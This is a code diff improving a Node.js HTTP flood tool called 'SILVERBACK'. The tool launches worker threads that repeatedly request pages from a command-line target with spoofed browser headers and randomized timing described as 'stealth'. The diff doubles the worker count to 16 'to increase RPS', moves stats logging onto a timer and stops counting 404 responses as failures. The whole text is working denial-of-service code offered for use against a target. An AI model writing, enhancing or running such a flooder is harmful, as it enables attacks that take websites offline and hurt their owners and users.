@@ -10,9 +10,8 @@ let totalRequests = 0;
 let successfulRequests = 0;
 let failedRequests = 0;
 
-// Clear terminal and print header
-function clearAndLog() {
-  console.clear(); // Clear the terminal screen
+// Clear terminal and print header at specific intervals
+function logStats() {
   console.log('SILVERBACK');
   console.log('==========');
   console.log(`TOTAL - ${totalRequests}`);
@@ -31,16 +30,11 @@ function generateRandomIP() {
   return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
 }
 
-// Random route generator (to avoid predictable patterns)
-function getRandomRoute() {
-  const routes = [
-    '/', '/index.html', '/assets/', '/favicon.ico', '/robots.txt', 
-    '/sitemap.xml', '/random/path1', '/user/profile', '/shop/products',
-    '/search?q=123', '/article?id=42', '/login', '/about-us',
-    '/contact-us', '/api/data', '/services', '/blog', '/signup'
-  ];
-  return routes[Math.floor(Math.random() * routes.length)];
-}
+// Define valid routes
+const validRoutes = [
+  '/', '/index.html', '/favicon.ico', '/robots.txt', '/sitemap.xml', 
+  '/about-us', '/contact-us', '/login', '/signup', '/blog'
+];
 
 // Random delay between requests (1 to 3 seconds)
 function getRandomDelay() {
@@ -54,7 +48,7 @@ function getSpoofedHeaders(target) {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-US,en;q=0.9',
-    'Referer': target + getRandomRoute(),
+    'Referer': target,
     'Origin': target,
     'Connection': 'keep-alive',
     'Cache-Control': 'no-cache',
@@ -73,12 +67,12 @@ function getSpoofedHeaders(target) {
 // Worker thread function to send requests
 function workerFunction(target) {
   let count = 0;
+  const route = validRoutes[Math.floor(Math.random() * validRoutes.length)];
+  const url = `${target}${route}`;
 
   // Send requests in a loop (each worker handles a separate instance)
   setInterval(async () => {
     try {
-      const route = getRandomRoute();
-      const url = `${target}${route}`;
       const response = await axios.get(url, {
         headers: getSpoofedHeaders(target),
         timeout: 15000, // Timeout for stealth mode (15 seconds)
@@ -88,17 +82,18 @@ function workerFunction(target) {
       // Successful request (status between 200-299)
       if (response.status >= 200 && response.status < 300) {
         successfulRequests++;
+      } else if (response.status === 404) {
+        // Skip 404 errors (don't count as failed)
+        console.log(`[INFO] Skipped 404 on ${url}`);
       } else {
         failedRequests++;
       }
 
       totalRequests++;
-      clearAndLog(); // Update the terminal logs
       count++;
     } catch (error) {
       failedRequests++;
       totalRequests++;
-      clearAndLog(); // Update the terminal logs
       console.error(`[Worker] Error: ${error.message}`);
     }
   }, getRandomDelay());
@@ -113,6 +108,9 @@ function startFlood(target, numThreads = 8) {
       process.exit(1);
     }
     
+    // Start logging every 10 seconds
+    setInterval(logStats, 10000); // Log stats every 10 seconds
+
     // Pass the target URL to worker threads
     for (let i = 0; i < numThreads; i++) {
       const worker = new Worker(__filename);
@@ -127,4 +125,4 @@ function startFlood(target, numThreads = 8) {
 
 // Execute the flood
 const target = process.argv[2];
-startFlood(target, 8);
+startFlood(target, 16); // Start with 16 threads to increase RPS
